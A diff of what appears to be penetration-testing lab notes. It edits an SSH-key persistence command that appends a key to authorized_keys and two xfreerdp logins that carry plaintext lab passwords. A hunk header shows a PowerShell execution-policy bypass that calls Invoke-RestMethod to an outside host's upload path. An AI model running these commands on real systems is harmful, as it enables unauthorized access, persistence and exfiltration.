@@ -167,7 +167,7 @@ https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbo
 
 ```
 
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fQqdcN8qxqB3OH9lCBMyGcAz+c8a5uRxuvif1A98/jv5LLYy/2GO7r68nHOSIviFtkbnydmuTyzBBSWhbxC/M...InI6BlsXQ65H3xw+yFxndxeKi3Gu17glt3OEe8aAPaxj3qU89L1xbOr4m3mSqnhJne7eV05nqYvZDHP+pgOQE02dmmplRfTHCKbEfwqY/nDx7QWw6WtrQigNlEGNcWJUVKNlXBGoGHZuyHNMpoh4XjinLeM9GKFY4xRxk2CyFBLwlouOtj7s5EtFB5CLnaQMpDtzI+gJyma7nzxJZxELrlTHyjPJoQHQSmlQe+tBNBRAEL92wac79psK7s3PARdCcyEnpe8l9cplPP8YIS8tMg6BVVjTGPQNN0BJBwRxEjrvAKae1phztkQD7tZKy3aEl8VCUR8tpJ0fw0mK6/PJGxgCYXZWWKwycHOnJKQYDL17qsTypaLL8= kali@kali" >> authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fQqdcN8qxqB3OH9lCBMyGcAz+c8a5uRxuvif1A98/jv5LLYy/2GO7r68nHOSIviFtkbnydmuTyzBBSWhbxC/M...InI6BlsXQ65H3xw+yFxndxeKi3Gu17glt3OEe8aAPaxj3qU89L1xbOr4m3mSqnhJne7eV05nqYvZDH...nDx7QWw6WtrQigNlEGNcWJUVKNlXBGoGHZuyHNMpoh4XjinLeM9GKFY4xRxk2CyFBLwlouOtj7s5EtFB5CLnaQMpDtzI+gJyma7nzxJZxELrlTHyjPJoQHQSmlQe+tBNBRAEL92wac79psK7s3PARdCcyEnpe8l9cplPP8YIS8tMg6BVVjTGPQNN0BJBwRxEjrvAKae1phztkQD7tZKy3aEl8VCUR8tpJ0fw0mK6/PJGxgCYXZWWKwycHOnJKQYDL17qsTypaLL8=" >> authorized_keys
 
 
 ```
@@ -553,7 +553,7 @@ powershell -nop -exec bypass Invoke-RestMethod -Uri http://10.10.131.147/web/upl
 
 ```
 
->xfreerdp /u:jeff /v:192.168.201.75 /d:corp.com /drive:/home,/home/kali/codeplay/
+>xfreerdp /u:jeff /v:192.168.201.75 /d:corp.com /drive:/home,/home/kali/code/
 >xfreerdp /u:administrator /p:'vau!XCKjNQBv2$' /v:172.16.124.6:3389 /h:1080 /w:1920 /floatbar /smart-sizing -grab-keyboard
 
 
@@ -563,7 +563,7 @@ powershell -nop -exec bypass Invoke-RestMethod -Uri http://10.10.131.147/web/upl
 
 ```
 
->xfreerdp /u:yoshi /p:Mushroom! /v:172.16.195.82 /drive:/home,/home/kali/codeplay/ /workarea
+>xfreerdp /u:yoshi /p:Mushroom! /v:172.16.195.82 /drive:/home,/home/kali/code/ /workarea
 
 
 ```
